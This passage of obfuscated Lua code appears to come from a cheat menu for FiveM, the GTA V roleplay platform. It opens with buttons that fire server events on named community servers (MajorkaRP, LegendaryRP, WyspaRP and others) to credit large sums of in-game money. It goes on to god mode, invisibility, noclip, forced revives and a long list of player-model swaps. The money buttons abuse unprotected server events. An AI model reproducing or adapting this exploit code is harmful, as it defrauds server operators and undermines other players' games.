                    TriggerServerEvent('wojtek_kurier:hajszanormalna')
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("MajorkaRP") then
                    TriggerServerEvent("ciemina:wygranko1plus", 33333)
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("BlizniaczeRP") then
                    TriggerServerEvent('TMM_elektrykNOKURWANONIEELOSMIECIUXD1243:cash', 64556546)
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("LegendaryRP") then
                    TriggerServerEvent('potato:zaplac', 333333333)
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("WyspaRP", "~r~100K TAXI") then
                    TriggerServerEvent('esx_taxijob:success', 100000)         
                end
            
                kaeogkeargmioergoeismgsdfg.rturtyue5tjtdfndt()
            elseif kaeogkeargmioergoeismgsdfg.reyrtrtjhy("SelfMenu") then
			    if kaeogkeargmioergoeismgsdfg.ehrtuydfbweeweghd("Modele »", "Modele") then end
                if kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Ulecz sie") then
                    SetEntityHealth(PlayerPedId(), 200)
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Kamizelka Kuloodporna") then
                    SetPedArmour(PlayerPedId(), 200)
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Revive", "~r~Native") then
                huiytdgsyfuyisdyiyodfoisf()
            elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Revnij sie", "") then
                TriggerServerEvent('esx_ambulancejob:revive')
                TriggerServerEvent('esx_ambulancejob:retestvivee')
                TriggerServerEvent('esx_ambulancejobb:revive')
                TriggerEvent('esx_ambulancejob:revive')
                TriggerEvent('esx_ambulancejob:revive997')
                TriggerEvent('esx_ambulancejob:revivehype')
                TriggerEvent('ambulancier:selfRespawn')
                TriggerEvent('esx_ambulancejob:lukirevive')
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Umrzyj") then
                    SetEntityHealth(PlayerPedId(), 0)
                elseif  kaeogkeargmioergoeismgsdfg.CheckBoxdskjhgfksdilfhsdf(
                    "NIESMIERTELNOSC",
                    GodModedfkjghdfkgdfg,
                    function(Enableddsyfusdsdfsdffdkjghdflgf)
                    GodModedfkjghdfkgdfg = Enableddsyfusdsdfsdffdkjghdflgf
                    end) 
                then
                elseif kaeogkeargmioergoeismgsdfg.CheckBoxdskjhgfksdilfhsdf(
                    "Nieskonczona Stamina",
                    infStaminafdkjlhgldifgdfg,
                    function(Enableddsyfusdsdfsdffdkjghdflgf)
                    infStaminafdkjlhgldifgdfg = Enableddsyfusdsdfsdffdkjghdflgf
                    end)
                then
                elseif kaeogkeargmioergoeismgsdfg.CheckBoxdskjhgfksdilfhsdf(
                    "Szybkie Bieganie",
                    fastrundfhjkgkjdfgdfg,
                    function(Enableddsyfusdsdfsdffdkjghdflgf)
                        fastrundfhjkgkjdfgdfg = Enableddsyfusdsdfsdffdkjghdflgf
                    end)
                then
                elseif kaeogkeargmioergoeismgsdfg.CheckBoxdskjhgfksdilfhsdf(
                    "Super Skok",
                    SuperJumpdfhjkgdflkijgdfg,
                    function(Enableddsyfusdsdfsdffdkjghdflgf)
                        SuperJumpdfhjkgdflkijgdfg = Enableddsyfusdsdfsdffdkjghdflgf
                    end)
                then
                elseif kaeogkeargmioergoeismgsdfg.CheckBoxdskjhgfksdilfhsdf(
                    "Niewidzialnosc",
                    Invisiblefdskjghdflkjgdfg,
                    function(Enableddsyfusdsdfsdffdkjghdflgf)
                        Invisiblefdskjghdflkjgdfg = Enableddsyfusdsdfsdffdkjghdflgf
                    end)
                then
                elseif kaeogkeargmioergoeismgsdfg.CheckBoxdskjhgfksdilfhsdf(
                    "Noclip",
                    Noclipfuighfdloiugfdg,
                    function(Enableddsyfusdsdfsdffdkjghdflgf)
                        Noclipfuighfdloiugfdg = Enableddsyfusdsdfsdffdkjghdflgf
                    end)
                then
                end
				
                kaeogkeargmioergoeismgsdfg.rturtyue5tjtdfndt()
            elseif kaeogkeargmioergoeismgsdfg.reyrtrtjhy("Modele") then
			if kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Clown') then
			local model = "s_m_y_clown_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Mime') then
			local model = "S_M_Y_Mime"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Stripper') then
		    local model = "s_f_y_stripper_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~b~ Cop M') then
		local model = "s_m_y_cop_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~b~ Cop F') then
		local model = "MP_F_Cop_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~b~ Sheriff M') then
		local model = "S_M_Y_Sheriff_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~b~ Sheriff F') then
		local model = "S_F_Y_Sheriff_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model ~b~SWAT M') then
		local model = "S_M_Y_Swat_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~b~ Armoured Ranger M') then
		local model = "S_M_M_Armoured_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end	
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~b~ Ranger F') then
		local model = "S_F_Y_Ranger_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end	
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~b~ Ranger Male') then
		local model = "S_M_Y_Ranger_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~b~ Robot Ranger Male') then
		local model = "U_M_Y_RSRanger_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~b~ Desert Army 01') then
		local model = "G_M_Y_DesArmy_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~b~ Desert Army 02') then
		local model = "G_M_Y_DesArmy_02"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~b~ Desert Army 03') then
		local model = "G_M_Y_DesArmy_03"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~b~ Desert Army 04') then
		local model = "G_M_Y_DesArmy_04"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~b~ Desert Army 05') then
		local model = "G_M_Y_DesArmy_05"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~b~ Marine 01') then
		local model = "S_M_Y_Marine_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end					
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~b~ Marine 02') then
		local model = "S_M_Y_Marine_02"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~b~ Marine 03') then
		local model = "S_M_Y_Marine_03"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~b~ Marine Commander') then
		local model = "S_M_M_Marine_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~b~ Marine General') then
		local model = "S_M_M_Marine_02"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~b~ Black OPS1 M') then
		local model = "S_M_Y_BlackOps_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~b~ Black OPS2 M') then
		local model = "S_M_Y_BlackOps_02"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~b~ Black OPS3 M') then
		local model = "S_M_Y_BlackOps_03"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~b~ Prison Guard M') then
		local model = "S_M_M_PrisGuard_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~b~ Paramedic M') then
		local model = "S_M_M_Paramedic_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~y~ Vagos F') then
		local model = "G_F_Y_Vagos_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~g~ Ramp Gang M') then
		local model = "IG_Ramp_Gang"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~g~ Ramp Gang Boss M') then
		local model = "CSB_Ramp_gang"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~g~ Fam Gang 01 M') then
		local model = "MP_M_FamDD_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~g~ Fam Gang 02 M') then
		local model = "G_M_Y_FamDNF_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~g~ Fam Gang Boss M') then
		local model = "G_M_Y_FamCA_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~p~ Bella Gang 01 M') then
		local model = "G_M_Y_BallaEast_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~p~ Bella Gang 02 M') then
		local model = "G_M_Y_BallaSout_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~p~ Bella Gang 03 M') then
		local model = "IG_BallasOG"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~p~ Bella Gang 04 M') then
		local model = "IG_BallasOG"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~p~ Bella Gang F') then
		local model = "G_F_Y_Ballas_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~p~ Bella Gang Boss M') then
		local model = "G_M_Y_BallaOrig_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Jewel F') then
		local model = "U_F_Y_JewelAss_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Jewel Thief') then
		local model = "U_M_M_JewelThief"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~o~ Prisoner 01 M') then
		local model = "S_M_Y_PrisMuscl_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~o~ Prisoner 02 M') then
		local model = "S_M_Y_Prisoner_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~o~ Prisoner 03 M') then
		local model = "U_M_Y_Prisoner_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Body Builder 01 M') then
		local model = "A_M_Y_MusclBeac_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Body Builder 02 M') then
		local model = "A_M_Y_MusclBeac_02"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Body Builder 03 M') then
		local model = "A_M_Y_Surfer_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Body Builder 04 M') then
		local model = "IG_TylerDix"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Body Builder 05 M') then
		local model = "u_m_y_babyd"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Body Builder F') then
		local model = "CS_MaryAnn"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Beach 01 F') then
		local model = "A_F_M_Beach_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Beach 02 F') then
		local model = "A_F_Y_Beach_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Beach Fat F') then
		local model = "A_F_M_FatCult_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Rich Female 01') then
		local model = "A_F_Y_BevHills_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Rich Female 02') then
		local model = "A_F_Y_BevHills_02"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Rich Female 03') then
		local model = "A_F_Y_BevHills_03"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Rich Female 04') then
		local model = "A_F_Y_BevHills_04"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Rich Female 05') then
		local model = "CSB_Bride"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Rich Female 06') then
		local model = "U_F_Y_PoppyMich"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Rich Female 07') then
		local model = "A_F_Y_SouCent_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Rich Female 08') then
		local model = "CSB_Anita"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Skater Female') then
		local model = "A_F_Y_Skater_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Rich Old Man') then
		local model = "U_M_O_TapHillBilly"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Rich Guy 01') then
		local model = "S_M_Y_Barman_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Rich Guy 02') then
		local model = "A_M_Y_BreakDance_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Rich Guy 03') then
		local model = "U_M_Y_Chip"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Rich Guy 04') then
		local model = "U_M_Y_GunVend_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Rich Guy 05') then
		local model = "CSB_Groom"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Rich Guy 06') then
		local model = "A_M_Y_Business_02"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Chinese M 01') then
		local model = "G_M_M_ChiBoss_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Chinese M 02') then
		local model = "G_M_M_ChiGoon_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Chinese M 03') then
		local model = "G_M_M_ChiGoon_02"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Chinese M 04') then
		local model = "CSB_Hao"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Chinese F') then
		local model = "A_F_Y_Vinewood_03"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Korean M 01') then
		local model = "A_M_Y_KTown_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Korean M 02') then
		local model = "A_M_Y_KTown_02"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Korean M 03') then
		local model = "G_M_M_KorBoss_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Korean M 04') then
		local model = "G_M_Y_Korean_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Korean M 05') then
		local model = "G_M_Y_Korean_02"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Korean F 01') then
		local model = "S_F_Y_MovPrem_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
